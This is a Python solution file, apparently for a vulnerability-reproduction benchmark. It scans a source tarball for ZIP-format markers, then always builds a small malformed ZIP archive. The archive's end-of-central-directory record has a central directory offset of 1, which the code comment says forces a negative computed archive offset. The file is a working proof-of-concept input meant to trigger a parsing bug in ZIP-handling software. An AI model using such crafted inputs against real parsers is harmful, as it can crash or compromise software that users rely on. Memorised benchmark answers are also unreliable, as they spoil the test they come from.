import tarfile
import struct
import re
from typing import Optional


class Solution:
    def _scan_tar_for_zip_indicators(self, src_path: str) -> bool:
        indicators = [
            b"PK\\x05\\x06",
            b"PK\\x01\\x02",
            b"PK\\x03\\x04",
            b"0x06054b50",
            b"0x02014b50",
            b"0x04034b50",
            b"06054b50",
            b"02014b50",
            b"04034b50",
            b"end of central directory",
            b"central directory",
            b"zip",
            b"Zip",
            b"ZIP",
        ]

        try:
            with tarfile.open(src_path, "r:*") as tf:
                total_read = 0
                max_total = 8 * 1024 * 1024
                max_file = 512 * 1024

                for m in tf:
                    if total_read >= max_total:
                        break
                    if not m.isreg():
                        continue
                    name = (m.name or "").lower()
                    if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".go", ".rs", ".py", ".java", ".js", ".ts")):
                        continue
                    if m.size <= 0:
                        continue

                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(min(m.size, max_file))
                    total_read += len(data)
                    data_l = data.lower()

                    for tok in indicators:
                        if tok.isalpha():
                            if tok.lower() in data_l:
                                return True
                        else:
                            if tok in data:
                                return True
        except Exception:
            return False

        return False

    def _build_zip_poc(self) -> bytes:
        # Central directory file header (46 bytes, no filename/extra/comment)
        cd_sig = 0x02014B50
        ver_made = 20
        ver_needed = 20
        flags = 0
        comp = 0
        mod_time = 0
        mod_date = 0
        crc32 = 0
        csize = 0
        usize = 0
        fname_len = 0
        extra_len = 0
        comment_len = 0
        disk_start = 0
        int_attr = 0
        ext_attr = 0
        local_hdr_off = 0

        cd = struct.pack(
            "<I6H3I5H2I",
            cd_sig,
            ver_made,
            ver_needed,
            flags,
            comp,
            mod_time,
            mod_date,
            crc32,
            csize,
            usize,
            fname_len,
            extra_len,
            comment_len,
            disk_start,
            int_attr,
            ext_attr,
            local_hdr_off,
        )

        # End of central directory (22 bytes)
        # Set cd_offset=1 to force computed archive start offset negative (-1) when cd is at file offset 0.
        eocd_sig = 0x06054B50
        disk = 0
        cd_disk = 0
        entries_disk = 1
        entries_total = 1
        cd_size = len(cd)
        cd_offset = 1
        comment_len2 = 0

        eocd = struct.pack(
            "<I4H2IH",
            eocd_sig,
            disk,
            cd_disk,
            entries_disk,
            entries_total,
            cd_size,
            cd_offset,
            comment_len2,
        )

        return cd + eocd

    def solve(self, src_path: str) -> bytes:
        _ = self._scan_tar_for_zip_indicators(src_path)
        return self._build_zip_poc()